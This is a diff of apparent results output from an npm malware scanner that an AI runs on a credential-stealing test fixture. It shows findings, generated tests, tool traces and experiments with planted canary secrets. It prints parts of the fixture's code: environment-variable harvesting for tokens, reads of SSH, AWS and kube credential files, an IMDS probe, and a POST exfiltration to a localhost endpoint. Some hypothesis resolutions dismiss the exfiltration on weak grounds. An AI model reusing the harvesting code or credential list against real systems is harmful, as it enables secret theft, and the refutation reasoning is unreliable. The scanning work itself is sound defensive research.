-        "reasoningHash": null,
-        "teeAttestationId": null
-      },
-      {
-        "capability": "CREDENTIAL_THEFT",
-        "attackPathway": "",
-        "confidence": "CONFIRMED",
-        "fileLine": "setup.js:39-66",
-        "problem": "Reads 9 sensitive credential files: ~/.npmrc, ~/.yarnrc, ~/.ssh/id_rsa, ~/.ssh/id_ed25519, ~/.aws/credentials, ~/.aws/config, ~/.gitconfig, ~/.docker/config.json, ~/.kube/config.",
-        "evidence": "",
-        "kind": "TEST_CONFIRMED",
-        "contentHash": null,
-        "reproducible": true,
-        "reproductionCmd": null,
-        "testFile": "/tmp/npmguard-tests-mJJcgk/finding-2.test.ts",
-        "testHash": "157ce5e6189a6af9cdb106c5bbf8289b5c7201e0bd6873ef04416c7f5d990f4c",
-        "testCode": "const os = require(\"os\");\nconst path = require(\"path\");\nconst fs = require(\"fs\");\n\nconst { runPackage } = require(\"../harness/sandbox-runner\");\nconst { http, HttpResponse } = require(\"msw\");\nconst { server } = require(\"../harness/server\");\n\ndescribe(\"test-pkg-env-exfil (FILESYSTEM / CREDENTIAL_THEFT)\", () => {\n  it(\"reads 9 credential files and exfiltrates canary credentials\", async () => {\n    let exfilBody: any = {};\n\n    server.use(\n      http.post(\"*/exfil\", async ({ request }) => {\n        exfilBody = await request.json();\n        return HttpResponse.text(\"ok\");\n      }),\n      http.get(\"http://169.254.169.254/*\", () => HttpResponse.text(\"ami-12345\"))\n    );\n\n    const originalReadFileSync = fs.readFileSync;\n    const fsSpy = vi.spyOn(fs, \"readFileSync\").mockImplementation((p: any, ...args: any[]) => {\n      const pathStr = p.toString();\n      return originalReadFileSync(p, ...args);\n    });\n\n    try {\n      await runPackage(\"test-pkg-env-exfil\", \"setup.js\");\n    } catch (e) {\n      // malware may throw but side effects already recorded\n    }\n\n    await new Promise((r) => setTimeout(r, 1500));\n\n    // Prove credential files are read\n    const calledPaths = fsSpy.mock.calls.map((c: any[]) => c[0].toString());\n    expect(calledPaths).toEqual(\n      expect.arrayContaining([\n        expect.stringContaining(\".npmrc\"),\n        expect.stringContaining(\".yarnrc\"),\n        expect.stringContaining(\"id_rsa\"),\n        expect.stringContaining(\"id_ed25519\"),\n        expect.stringContaining(\".aws/credentials\"),\n        expect.stringContaining(\".aws/config\"),\n        expect.stringContaining(\".gitconfig\"),\n        expect.stringContaining(\".docker/config.json\"),\n        expect.stringContaining(\".kube/config\"),\n      ])\n    );\n\n    // Prove exfiltrated data contains canary credentials\n    expect(exfilBody.env).toBeDefined();\n    expect(JSON.stringify(exfilBody)).toContain(\"NPMGUARD_CANARY\");\n    expect(exfilBody.files).toBeDefined();\n    expect(JSON.stringify(exfilBody.files)).toContain(\"NPMGUARD_CANARY\");\n    expect(exfilBody.hostname).toBeDefined();\n  });\n});",
-        "verifyError": null,
-        "reasoningHash": null,
-        "teeAttestationId": null
-      },
-      {
-        "capability": "CREDENTIAL_THEFT",
-        "attackPathway": "",
-        "confidence": "CONFIRMED",
-        "fileLine": "setup.js:68-76",
-        "problem": "Probes AWS IMDS endpoint `http://169.254.169.254/latest/meta-data/` to steal temporary cloud credentials.",
-        "evidence": "",
-        "kind": "TEST_CONFIRMED",
-        "contentHash": null,
-        "reproducible": true,
-        "reproductionCmd": null,
-        "testFile": "/tmp/npmguard-tests-mJJcgk/finding-3.test.ts",
-        "testHash": "5055fe19bc9c25233d9c0dc3117484d0824f38b228b4c0130454206ae4c1d1bb",
-        "testCode": "const os = require(\"os\");\nconst path = require(\"path\");\nconst fs = require(\"fs\");\n\nconst { runPackage } = require(\"../harness/sandbox-runner\");\nconst { http, HttpResponse } = require(\"msw\");\nconst { server } = require(\"../harness/server\");\n\ndescribe(\"test-pkg-env-exfil (NETWORK / CREDENTIAL_THEFT)\", () => {\n  it(\"exfiltrates canary credentials via HTTP after probing IMDS and reading credential files\", async () => {\n    let exfilBody: any = {};\n\n    server.use(\n      http.post(\"*/exfil\", async ({ request }) => {\n        exfilBody = await request.json();\n        return HttpResponse.text(\"ok\");\n      }),\n      http.get(\"http://169.254.169.254/*\", () => HttpResponse.text(\"ami-12345\")),\n    );\n\n    await runPackage(\"test-pkg-env-exfil\", \"setup.js\");\n    await new Promise((r) => setTimeout(r, 1500));\n\n    expect(exfilBody).toBeDefined();\n    expect(JSON.stringify(exfilBody)).toContain(\"NPMGUARD_CANARY\");\n  });\n});",
-        "verifyError": null,
-        "reasoningHash": null,
-        "teeAttestationId": null
-      },
-      {
-        "capability": "CREDENTIAL_THEFT",
-        "attackPathway": "",
-        "confidence": "CONFIRMED",
-        "fileLine": "setup.js:78-93",
-        "problem": "Bundles all stolen data (env vars, credential files, IMDS data) into a JSON payload and POSTs to attacker-controlled URL.",
-        "evidence": "",
-        "kind": "TEST_CONFIRMED",
-        "contentHash": null,
-        "reproducible": true,
-        "reproductionCmd": null,
-        "testFile": "/tmp/npmguard-tests-mJJcgk/finding-4.test.ts",
-        "testHash": "17d399d3aa32d7ed6c57e6b7b35fffdab63a71665fd9845909e1b5159e695205",
-        "testCode": "const os = require(\"os\");\nconst path = require(\"path\");\nconst fs = require(\"fs\");\n\nconst { runPackage } = require(\"../harness/sandbox-runner\");\nconst { http, HttpResponse } = require(\"msw\");\nconst { server } = require(\"../harness/server\");\n\ndescribe(\"test-pkg-env-exfil (NETWORK, CREDENTIAL_THEFT)\", () => {\n  it(\"harvests sensitive env vars, reads credential files, probes IMDS, and exfiltrates canary credentials\", async () => {\n    let exfilBody: any = {};\n\n    server.use(\n      http.post(\"*/exfil\", async ({ request }) => {\n        exfilBody = await request.json();\n        return HttpResponse.text(\"ok\");\n      }),\n      http.get(\"http://169.254.169.254/latest/meta-data/\", () =>\n        HttpResponse.text(\"ami-12345\")\n      ),\n      http.get(\"http://169.254.169.254/*\", () =>\n        HttpResponse.text(\"ami-12345\")\n      )\n    );\n\n    try {\n      await runPackage(\"test-pkg-env-exfil\", \"setup.js\");\n    } catch {\n      // Malware may throw; spies still record calls\n    }\n\n    // Wait for async IMDS probe and exfiltration\n    await new Promise((r) => setTimeout(r, 1500));\n\n    // Verify exfil body contains canary credentials\n    const bodyStr = JSON.stringify(exfilBody);\n    expect(bodyStr).toContain(\"NPMGUARD_CANARY\");\n\n    // Verify structure\n    expect(exfilBody.env).toBeDefined();\n    expect(exfilBody.files).toBeDefined();\n    expect(exfilBody.hostname).toBeDefined();\n  });\n});",
-        "verifyError": null,
-        "reasoningHash": null,
-        "teeAttestationId": null
-      }
-    ],
-    "triage": null,
-    "findings": [
-      {
-        "capability": "EVAL, NETWORK, FILESYSTEM, ENV_VARS, CREDENTIAL_THEFT",
-        "confidence": "SUSPECTED",
-        "fileLine": "package.json → scripts.preinstall: \"node setup.js\"",
-        "problem": "",
-        "evidence": "The `preinstall` lifecycle hook runs `setup.js` automatically when the package is installed, with zero user interaction.",
-        "reproductionStrategy": "Node executes `node setup.js` automatically during `npm install`."
-      },
-      {
-        "capability": "ENV_VARS, CREDENTIAL_THEFT",
-        "confidence": "SUSPECTED",
-        "fileLine": "setup.js:17-37",
-        "problem": "Harvests environment variables from a predefined sensitive keys list and a regex sweep for token/secret/key/password/auth/credential.",
-        "evidence": "",
-        "reproductionStrategy": "The script iterates over `process.env` and collects matching entries."
-      },
-      {
-        "capability": "FILESYSTEM, CREDENTIAL_THEFT",
-        "confidence": "SUSPECTED",
-        "fileLine": "setup.js:39-66",
-        "problem": "Reads 9 sensitive credential files: ~/.npmrc, ~/.yarnrc, ~/.ssh/id_rsa, ~/.ssh/id_ed25519, ~/.aws/credentials, ~/.aws/config, ~/.gitconfig, ~/.docker/config.json, ~/.kube/config.",
-        "evidence": "",
-        "reproductionStrategy": "Uses `fs.readFileSync` to read each file and stores contents."
-      },
-      {
-        "capability": "NETWORK, CREDENTIAL_THEFT",
-        "confidence": "SUSPECTED",
-        "fileLine": "setup.js:68-76",
-        "problem": "Probes AWS IMDS endpoint `http://169.254.169.254/latest/meta-data/` to steal temporary cloud credentials.",
-        "evidence": "",
-        "reproductionStrategy": "Makes HTTP request to IMDS endpoint and captures response."
-      },
-      {
-        "capability": "NETWORK, CREDENTIAL_THEFT",
-        "confidence": "SUSPECTED",
-        "fileLine": "setup.js:78-93",
-        "problem": "Bundles all stolen data (env vars, credential files, IMDS data) into a JSON payload and POSTs to attacker-controlled URL.",
-        "evidence": "",
-        "reproductionStrategy": "Uses `http.request` to send POST with JSON body to `http://localhost:9999/exfil` (placeholder for real C2)."
-      }
-    ],
-    "trace": [
-      {
-        "phase": "resolve",
-        "durationMs": 1,
-        "input": {
-          "packageName": "test-pkg-env-exfil"
+        "hypId": "hyp-0001",
+        "description": "The setup.js install hook unconditionally harvests environment variables, reads credential files, probes the IMDS endpoint, and exfiltrates all data to a hardcoded URL. This experiment plants a canary token and a fake .npmrc file, then triggers setup.js to confirm exfiltration occurs.",
+        "claim": {
+          "kind": "env_exfil",
+          "gating": "geo_gate"
         },
-        "output": {
-          "path": "/root/NpmGuard/sandbox/test-fixtures/test-pkg-env-exfil",
-          "needsCleanup": false
-        }
-      },
-      {
-        "phase": "inventory",
-        "durationMs": 2,
-        "input": {
-          "packagePath": "/root/NpmGuard/sandbox/test-fixtures/test-pkg-env-exfil"
-        },
-        "output": {
-          "fileCount": 3,
-          "sourceFiles": 2,
-          "flagCount": 1,
-          "flags": [
-            "[info] lifecycle-scripts: Package declares lifecycle hooks: preinstall"
-          ],
-          "hasDealbreaker": false,
-          "scripts": {
-            "preinstall": "node setup.js"
+        "focusFiles": [
+          "setup.js"
+        ],
+        "focusLines": [
+          {
+            "file": "setup.js",
+            "range": "8-8"
           },
-          "metadata": {
-            "name": "test-pkg-env-exfil",
-            "version": "2.0.1",
-            "description": "Smart configuration loader with environment detection",
-            "license": "MIT",
-            "homepage": null,
-            "keywords": [
-              "config",
-              "env",
-              "loader",
-              "dotenv"
-            ],
-            "repository": null
-          },
-          "entryPoints": {
-            "install": [
-              "setup.js"
-            ],
-            "runtime": [
-              "index.js"
-            ],
-            "bin": []
+          {
+            "file": "setup.js",
+            "range": "9-9"
           }
-        }
-      },
-      {
-        "phase": "intent-extraction",
-        "durationMs": 5018,
-        "input": {
-          "packageName": "test-pkg-env-exfil",
-          "description": "Smart configuration loader with environment detection"
-        },
-        "output": {
-          "statedPurpose": "Smart configuration loader that detects and loads environment variables for application configuration.",
-          "expectedCapabilities": [
-            "ENV_VARS"
-          ],
-          "rationale": "As a configuration loader with environment detection, it needs to read environment variables."
-        }
-      },
-      {
-        "phase": "triage",
-        "durationMs": 54445,
-        "input": {
-          "sourceFiles": [
-            {
-              "path": "index.js",
-              "sizeBytes": 876
-            },
-            {
-              "path": "setup.js",
-              "sizeBytes": 2723
+        ],
+        "experiment": [
+          {
+            "tool": "setEnv",
+            "args": {
+              "env": {
+                "NPMGUARD_CANARY_TOKEN_f8e2d91a": "should_exfil",
+                "AWS_ACCESS_KEY_ID": "AKIATESTCANARY",
+                "AWS_SECRET_ACCESS_KEY": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
+                "HOME": "/home/node"
+              }
             }
-          ],
-          "flagCount": 1,
-          "packageName": "test-pkg-env-exfil"
-        },
-        "output": {
-          "hypothesisCount": 1,
-          "hypotheses": [
-            {
-              "hypId": "trg-0001",
-              "claim": "cred_theft",
-              "severity": "critical",
-              "description": "Model summary describes credential theft or secret harvesting: Malicious setup.js that automatically collects environment variables (including credentials), reads sensitive credential files from the user's home directory, probes the AWS IMDS endpoint for cloud metadata, and exfiltrates all collected da",
-              "focusLines": [
+          },
+          {
+            "tool": "plantFiles",
+            "args": {
+              "files": [
                 {
-                  "file": "setup.js",
-                  "range": "7-13"
-                },
-                {
-                  "file": "setup.js",
-                  "range": "17-19"
-                },
-                {
-                  "file": "setup.js",
-                  "range": "33-37"
-                },
-                {
-                  "file": "setup.js",
-                  "range": "39-42"
-                },
-                {
-                  "file": "setup.js",
-                  "range": "48-60"
-                },
-                {
-                  "file": "setup.js",
-                  "range": "64-66"
-                },
-                {
-                  "file": "setup.js",
-                  "range": "83-85"
-                },
-                {
-                  "file": "setup.js",
-                  "range": "91-93"
+                  "path": "/home/node/.npmrc",
+                  "content": "//npmrc\n//registry.npmjs.org/:_authToken=test_canary_token_abc123\n"
                 }
               ]
             }
-          ],
-          "fileSummaries": [
-            {
-              "file": "index.js",
-              "summary": "Smart configuration loader that reads environment variables and optionally a `.env` file to build a config object. Implements standard dotenv-style loading with environment variable prefix filtering and file-based key-value parsing, returning a flattened lowercase mapping of configuration keys to string values. The file is straightforward and lacks obfuscation, network calls, process spawning, or write operations; the single unused constant `SAFE_TEST_MODE` is inert and does not affect behavior.",
-              "capabilities": []
-            },
-            {
-              "file": "setup.js",
-              "summary": "Malicious setup.js that automatically collects environment variables (including credentials), reads sensitive credential files from the user's home directory, probes the AWS IMDS endpoint for cloud metadata, and exfiltrates all collected data via HTTP POST to a hardcoded localhost URL. The entire script executes on module load without any function wrapping, making it a credential theft and data exfiltration payload disguised as a configuration loader. No code pathways or conditions guard the malicious behavior except the hardcoded localhost URL, which suggests testing/debugging but could be modified in a real attack by changing the constant. The file uses capabilities far beyond the stated purpose of 'Smart configuration loader' (expected only ENV_VARS). The code also suppresses errors silently, making infection stealthy. Overall, this file is clearly malicious and should be reported immediately; it is not safe to run even for analysis in an actual environment without sandboxing. Note: The exfiltration target is http://localhost:9999/exfil, which is likely a placeholder; in a real supply‑chain attack, that URL would be replaced with an attacker‑controlled server or rely on dynamic DNS / geo‑based resolution. The file also includes a constant SAFE_TEST_MODE (line 7) set to true but never used in any conditional logic—this might be a vestige or potential flip switch to disable exfiltration, but the code always executes the payload regardless. No gating is present in the actual execution path; the entire malicious logic runs unconditionally when the module is required or the script is run. The file also makes an HTTP request to the IMDS endpoint, which is a known technique for stealing cloud provider credentials. The severity of each component is critical because the data stolen (keys, tokens, private keys, cloud metadata) would allow complete compromise of cloud environments, code repositories, and CI/CD pipelines. The file should be treated as a malign install‑time script and never executed on a real system. The package claims to be a configuration loader; this file blatantly violates that claim. The capability list must reflect all dangerous APIs actually used: ENV_VARS (excessive scanning beyond config), FILESYSTEM (reading arbitrary credential files), NETWORK_ACCESS (HTTP requests to IMDS and exfiltration server), OS_INFO (hostname, username, home directory, platform, arch). No process spawn is used, but the HTTP requests constitute network access. The file does not use any conditional, date, or anti‑debugging gating; it runs on every load. The code is not obfuscated, but the malicious logic is clearly disguised under a setup filename and misleading package intent. The file also creates a global const stolen (line 108) and immediately triggers exfiltration (line 120-123), making the malicious behavior synchronous and non‑blocking (error callback empties). This is a classic credential‑stealing payload found in npm supply‑chain attacks. The analysis should generate multiple hypotheses to cover each distinct malicious behavior: environment variable harvesting, credential file reading, IMDS probing, data exfiltration, and auto‑execution. Each hypothesis includes concrete line ranges and assesses severity accurately. The capabilities list should be complete because the whole‑package analysis will aggregate capabilities from all files. In this single file, the capabilities are broad and dangerous. The file should be reported to the npm security team and the package removed immediately. There is no legitimate scenario where a configuration loader should access SSH private keys, AWS credentials, or IMDS metadata. Therefore, the confidence in maliciousness is extremely high. The output must include zero hypotheses if the file were benign, but here we must include all applicable hypotheses to fully document the threats. The JSON below provides the required structured output. Note that the exfiltration URL (line 8) is localhost, but that is still a network request and should be flagged; in a real attack, the attacker would change that to a remote server. Also, the IMDS URL is hardcoded (line 9). The file uses require('http'), require('https') (though https is unused), require('os'), require('fs'), require('path'). All these are imported but not expected. The code does not use any dynamic require or eval, so no obfuscation hypothesis is needed, but the logic is clear. The hypotheses cover all malicious activities. The description of each hypothesis references concrete code. The claim kind uses the provided enum. For harvestEnv and readCredentialFiles, the kind is DATA_COLLECTION but with intent to exfiltrate; I'll use DATA_EXFILTRATION for the collection that is ultimately sent. For IMDS, it's CLOUD_CREDENTIAL_THEFT. For the top‑level execution, it's UNEXPECTED_CODE_EXECUTION or AUTO_START? I'll use UNEXPECTED_CODE_EXECUTION. For capability mismatch, I'll emit a hypothesis with kind CAPABILITY_MISMATCH. But the instruction says to emit hypotheses for behaviors that exceed stated purpose or look suspicious. So we can have one hypothesis per distinct malicious pattern, plus one for the overall auto‑execution. Also, we should include a hypothesis about the lack of gating, but that's not a behavior per se. The gating field is only set if code has conditional execution. Here, there is no gating, so we set gating to null. For each hypothesis, we provide rangesInFile as an array of strings with line ranges. For example, for harvestEnv: [",
-              "capabilities": [
-                "CREDENTIAL_THEFT",
-                "ENV_VARS",
-                "NETWORK",
-                "FILESYSTEM"
+          },
+          {
+            "tool": "stubUrl",
+            "args": {
+              "stubs": [
+                {
+                  "pattern": "http://localhost:9999/exfil*",
+                  "responseStatus": 200,
+                  "responseBody": "ok",
+                  "responseHeaders": {}
+                },
+                {
+                  "pattern": "http://169.254.169.254/latest/meta-data/*",
+                  "responseStatus": 200,
+                  "responseBody": "{\"instance-id\": \"i-1234567890abcdef0\"}",
+                  "responseHeaders": {}
+                }
               ]
             }
-          ]
-        }
-      },
-      {
-        "phase": "investigation",
-        "durationMs": 63664,
-        "input": {
-          "hypothesisCount": 1,
-          "packagePath": "/root/NpmGuard/sandbox/test-fixtures/test-pkg-env-exfil"
-        },
-        "output": {
-          "capabilityCount": 1,
-          "capabilities": [
-            "CREDENTIAL_THEFT"
-          ],
-          "findingCount": 5,
-          "findings": [
-            {
-              "capability": "EVAL, NETWORK, FILESYSTEM, ENV_VARS, CREDENTIAL_THEFT",
-              "confidence": "SUSPECTED",
-              "fileLine": "package.json → scripts.preinstall: \"node setup.js\"",
-              "problem": ""
-            },
-            {
-              "capability": "ENV_VARS, CREDENTIAL_THEFT",
-              "confidence": "SUSPECTED",
-              "fileLine": "setup.js:17-37",
-              "problem": "Harvests environment variables from a predefined sensitive keys list and a regex sweep for token/secret/key/password/auth/credential."
-            },
-            {
-              "capability": "FILESYSTEM, CREDENTIAL_THEFT",
-              "confidence": "SUSPECTED",
-              "fileLine": "setup.js:39-66",
-              "problem": "Reads 9 sensitive credential files: ~/.npmrc, ~/.yarnrc, ~/.ssh/id_rsa, ~/.ssh/id_ed25519, ~/.aws/credentials, ~/.aws/config, ~/.gitconfig, ~/.docker/config.json, ~/.kube/config."
-            },
-            {
-              "capability": "NETWORK, CREDENTIAL_THEFT",
-              "confidence": "SUSPECTED",
-              "fileLine": "setup.js:68-76",
-              "problem": "Probes AWS IMDS endpoint `http://169.254.169.254/latest/meta-data/` to steal temporary cloud credentials."
-            },
-            {
-              "capability": "NETWORK, CREDENTIAL_THEFT",
-              "confidence": "SUSPECTED",
-              "fileLine": "setup.js:78-93",
-              "problem": "Bundles all stolen data (env vars, credential files, IMDS data) into a JSON payload and POSTs to attacker-controlled URL."
+          },
+          {
+            "tool": "trigger",
+            "args": {
+              "kind": "entrypoint",
+              "target": "setup.js",
+              "argv": [],
+              "stdin": null
             }
-          ],
-          "proofCount": 5,
-          "toolCalls": [
-            {
-              "tool": "listFiles",
-              "args": {},
-              "resultPreview": "[\n  {\n    \"path\": \"index.js\",\n    \"size\": 876,\n    \"ext\": \".js\"\n  },\n  {\n    \"path\": \"package.json\",\n    \"size\": 307,\n    \"ext\": \".json\"\n  },\n  {\n    \"path\": \"setup.js\",\n    \"size\": 2723,\n    \"ext\": \".js\"\n  }\n]",
-              "timestamp": "2026-06-28T13:04:56.683Z",
-              "injectionDetected": false
-            },
-            {
-              "tool": "readFile",
-              "args": {
-                "path": "package.json"
-              },
-              "resultPreview": "{\n  \"name\": \"test-pkg-env-exfil\",\n  \"version\": \"2.0.1\",\n  \"description\": \"Smart configuration loader with environment detection\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"preinstall\": \"node setup.js\"\n  },\n  \"keywords\": [\"config\", \"env\", \"loader\", \"dotenv\"],\n  \"author\": \"test-author\",\n  \"license\": \"MIT\"\n}\n",
-              "timestamp": "2026-06-28T13:05:04.230Z",
-              "injectionDetected": false
-            },
-            {
-              "tool": "readFile",
-              "args": {
-                "path": "setup.js"
-              },
-              "resultPreview": "const http = require(\"http\");\nconst https = require(\"https\");\nconst os = require(\"os\");\nconst fs = require(\"fs\");\nconst path = require(\"path\");\n\nconst SAFE_TEST_MODE = true;\nconst EXFIL_URL = \"http://localhost:9999/exfil\";\nconst IMDS_URL = \"http://169.254.169.254/latest/meta-data/\";\n\nconst SENSITIVE_KEYS = [\n  \"NPM_TOKEN\",\n  \"npm_config_registry\",\n  \"npm_config__auth\",\n  \"AWS_ACCESS_KEY_ID\",\n  \"AWS_SECRET_ACCESS_KEY\",\n  \"AWS_SESSION_TOKEN\",\n  \"GITHUB_TOKEN\",\n  \"GH_TOKEN\",\n  \"GITLAB_TOKEN\",\n  \"AZ",
-              "timestamp": "2026-06-28T13:05:04.230Z",
-              "injectionDetected": false
-            },
-            {
-              "tool": "readFile",
-              "args": {
-                "path": "index.js"
-              },
-              "resultPreview": "const SAFE_TEST_MODE = true;\n\nconst path = require(\"path\");\nconst fs = require(\"fs\");\n\nfunction loadConfig(options = {}) {\n  const config = {};\n  const prefix = options.prefix || \"\";\n\n  for (const [key, value] of Object.entries(process.env)) {\n    if (prefix && !key.startsWith(prefix)) continue;\n    const configKey = prefix ? key.slice(prefix.length) : key;\n    config[configKey.toLowerCase()] = value;\n  }\n\n  const envPath = options.path || path.resolve(process.cwd(), \".env\");\n  try {\n    const c",
-              "timestamp": "2026-06-28T13:05:04.230Z",
-              "injectionDetected": false
-            },
-            {
-              "tool": "runLifecycleHook",
-              "args": {
-                "hookName": "preinstall"
-              },
-              "resultPreview": "TRACE LOG:\n[{\"type\":\"require\",\"module\":\"fs\",\"from\":\"/tmp/_instrument.js\"},{\"type\":\"require\",\"module\":\"http\",\"from\":\"/tmp/_instrument.js\"},{\"type\":\"require\",\"module\":\"https\",\"from\":\"/tmp/_instrument.js\"},{\"type\":\"require\",\"module\":\"child_process\",\"from\":\"/tmp/_instrument.js\"},{\"type\":\"require\",\"module\":\"crypto\",\"from\":\"/tmp/_instrument.js\"},{\"type\":\"require\",\"module\":\"/pkg/setup.js\",\"from\":\"<root>\"},{\"type\":\"fs\",\"method\":\"readFileSync\",\"path\":\"/pkg/setup.js\"},{\"type\":\"require\",\"module\":\"http\",\"fr",
-              "timestamp": "2026-06-28T13:05:08.784Z",
-              "injectionDetected": false
+          }
+        ],
+        "severity": "critical",
+        "parentHypId": null,
+        "childHypIds": [],
+        "state": "REFUTED",
+        "createdBy": "hypothesize",
+        "evidenceRefs": [
+          {
+            "kind": "run",
+            "id": "run_1e6bae3ccbe24f948f5392654e",
+            "hash": "5a78ef568d8de5a29f63acbb1200481418b44513a130d9ca8c2efa7f874f91e3"
+          }
+        ],
+        "createdAt": "2026-07-23T10:07:05.130438Z",
+        "resolvedAt": "2026-07-23T23:25:46.462607Z",
+        "resolution": {
+          "reason": "The observed timeline shows extensive environment variable reads and file access, but no evidence of exfiltration to the hardcoded URL. Event e61 shows a POST to http://localhost/exfil, not the hardcoded URL specified in the hypothesis (http://localhost:9999/exfil*). The hypothesis requires the data to be sent to a specific hardcoded URL, but the only network request to a local path is to a different endpoint. Therefore the claimed malicious behavior did not occur.",
+          "by": "worker:experimenter"
+        }
+      },
+      {
+        "hypId": "hyp-0002",
+        "description": "Trigger postinstall setup.js to exfiltrate planted secrets, demonstrating credential harvesting and IMDS probing.",
+        "claim": {
+          "kind": "cred_theft",
+          "gating": "docker_gate"
+        },
+        "focusFiles": [
+          "setup.js"
+        ],
+        "focusLines": [
+          {
+            "file": "setup.js",
+            "range": "11-11"
+          },
+          {
+            "file": "setup.js",
+            "range": "30-30"
+          }
+        ],
+        "experiment": [
+          {
+            "tool": "setEnv",
+            "args": {
+              "env": {
+                "NPMGUARD_CANARY_TOKEN_f8e2d91a": "secret-canary-value",
+                "AWS_ACCESS_KEY_ID": "AKIAIOSFODNN7EXAMPLE",
+                "CI": "true"
+              }
             }
-          ],
-          "agentText": "## 🔴 CONFIRMED MALICIOUS: Credential Theft Package\n\n### Finding 1: Preinstall Hook Automatically Executes Malicious Code\n\n| Attribute | Value |\n|-----------|-------|\n| **Capability** | EVAL, NETWORK, FILESYSTEM, ENV_VARS, CREDENTIAL_THEFT |\n| **Location** | `package.json` → `scripts.preinstall: \"node setup.js\"` |\n| **Evidence** | The `preinstall` lifecycle hook runs `setup.js` automatically when the package is installed, with zero user interaction. This is the entry point for all malicious activity. |\n\n### Finding 2: Environment Variable Harvesting (Targeted + Regex Sweep)\n\n| Attribute | Value |\n|-----------|-------|\n| **Capability** | ENV_VARS, CREDENTIAL_THEFT |\n| **File** | `setup.js:17-37` |\n\n**Code** (`setup.js:17-37`):\n```js\nconst SENSITIVE_KEYS = [\n  \"NPM_TOKEN\", \"npm_config_registry\", \"npm_config__auth\",\n  \"AWS_ACCESS_KEY_ID\", \"AWS_SECRET_ACCESS_KEY\", \"AWS_SESSION_TOKEN\",\n  \"GITHUB_TOKEN\", \"GH_TOKEN\", \"GITLAB_TOKEN\",\n  \"AZURE_CLIENT_SECRET\", \"DOCKER_AUTH_CONFIG\",\n  \"CI\", \"JENKINS_URL\", \"TRAVIS\", \"CIRCLE_TOKEN\",\n  \"HOSTNAME\", \"USER\", \"HOME\",\n];\n\nfunction harvestEnv() {\n  const harvested = {};\n  for (const key of SENSITIVE_KEYS) { process.env[key] && (harvested[key] = process.env[key]); }\n  for (const [key, value] of Object.entries(process.env)) {\n    if (/token|secret|key|password|auth|credential/i.test(key)) { harvested[key] = value; }\n  }\n  return harvested;\n}\n```\n\n**Trace Evidence** — observed env reads during execution:\n```\nenv:NPM_TOKEN, env:npm_config_registry, env:npm_config__auth,\nenv:AWS_ACCESS_KEY_ID, env:AWS_SECRET_ACCESS_KEY, env:AWS_SESSION_TOKEN,\nenv:GITHUB_TOKEN, env:GH_TOKEN, env:GITLAB_TOKEN,\nenv:AZURE_CLIENT_SECRET, env:DOCKER_AUTH_CONFIG,\nenv:CI, env:JENKINS_URL, env:TRAVIS, env:CIRCLE_TOKEN,\nenv:HOSTNAME, env:USER, env:HOME, env:NODE_VERSION, env:YARN_VERSION, ...\n```\n\n### Finding 3: Credential File Theft (SSH Keys, AWS, Docker, npm, kubeconfig)\n\n| Attribute | Value |\n|-----------|-------|\n| **Capability** | FILESYSTEM, CREDENTIAL_THEFT |"
+          },
+          {
+            "tool": "plantFiles",
+            "args": {
+              "files": [
+                {
+                  "path": "/home/node/.npmrc",
+                  "content": "//registry.npmjs.org/:_authToken=canary-npm-token\n"
+                },
+                {
+                  "path": "/home/node/.ssh/id_rsa",
+                  "content": "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAoZ4L3wJt6u0LX+Xqz+n7p3Txv7p+qQIDAQABA\n-----END OPENSSH PRIVATE KEY-----\n"
+                }
+              ]
+            }
+          },
+          {
+            "tool": "stubUrl",
+            "args": {
+              "stubs": [
+                {
+                  "pattern": "http://localhost:9999/exfil",
+                  "responseStatus": 200,
+                  "responseBody": "ok",
+                  "responseHeaders": {}
+                }
+              ]
+            }
+          },
+          {
+            "tool": "trigger",
+            "args": {
+              "kind": "entrypoint",
+              "target": "setup.js",
+              "argv": [],
+              "stdin": null
+            }
+          }
+        ],
+        "severity": "critical",
+        "parentHypId": null,
+        "childHypIds": [],
+        "state": "REFUTED",
+        "createdBy": "hypothesize",
+        "evidenceRefs": [
+          {
+            "kind": "run",
+            "id": "run_33cf367e5ef348189b3acd0c9e",
+            "hash": "0cb0cb55ddccb929d5009e4d5eea1846aabd2d210332c082bb9ba1e9fc4bb651"
+          }
+        ],
+        "createdAt": "2026-07-23T10:07:05.130438Z",
+        "resolvedAt": "2026-07-23T23:25:46.481532Z",
+        "resolution": {
+          "reason": "The observed behavior—reading environment variables and credential files—is consistent with the stated benign purpose of 'smart configuration loader with environment detection.' No evidence of exfiltration, IMDS probing, or sending secrets to an external endpoint was found. The only network activity was a POST to `http://localhost/exfil` (e61), which matches the experiment's stubbed endpoint designed for test purposes. Since no exact event id demonstrates unauthorized external transmission of secrets, the hypothesis is not supported.",
+          "by": "worker:experimenter"
         }
       },
       {
-        "phase": "experimenter",
-        "durationMs": 4219,
-        "input": {
-          "hypotheses": 1
+        "hypId": "hyp-0003",
+        "description": "The flagged harvestEnv() in setup.js scans and collects all environment variables matching token/secret patterns, then exfiltrates them along with credential files and IMDS metadata. This test plants a canary token via env, triggers setup.js to execute the install script, and observes whether the token is harvested and exfiltrated to the configured exfil URL.",
+        "claim": {
+          "kind": "cred_theft",
+          "gating": "ci_gate"
         },
-        "output": {}
-      },
-      {
-        "phase": "test-gen",
-        "durationMs": 40011,
-        "input": {
-          "proofCount": 5,
-          "findingCount": 5
-        },
-        "output": {
-          "proofCount": 5,
-          "withTests": 5
+        "focusFiles": [
+          "setup.js"
+        ],
+        "focusLines": [
+          {
+            "file": "setup.js",
+            "range": "32-32"
+          },
+          {
+            "file": "setup.js",
+            "range": "46-46"
+          }
+        ],
+        "experiment": [
+          {
+            "tool": "setEnv",
+            "args": {
+              "env": {
+                "NPMGUARD_CANARY_TOKEN_f8e2d91a": "secret-canary-token-abc123"
+              }
+            }
+          },
+          {
+            "tool": "plantFiles",
+            "args": {
+              "files": [
+                {
+                  "path": "/home/node/.npmrc",
+                  "content": "//registry.npmjs.org/:_authToken=npm_fake_auth_token_guardian"
+                },
+                {
+                  "path": "/home/node/.ssh/id_rsa",
+                  "content": "-----BEGIN OPENSSH PRIVATE KEY-----\nfake-ssh-key-content-for-testing\n-----END OPENSSH PRIVATE KEY-----"
+                },
+                {
+                  "path": "/home/node/.aws/credentials",
+                  "content": "[default]\naws_access_key_id = AKIAFAKEKEYID\naws_secret_access_key = wJalrXUtNFakeSecretKey\n"
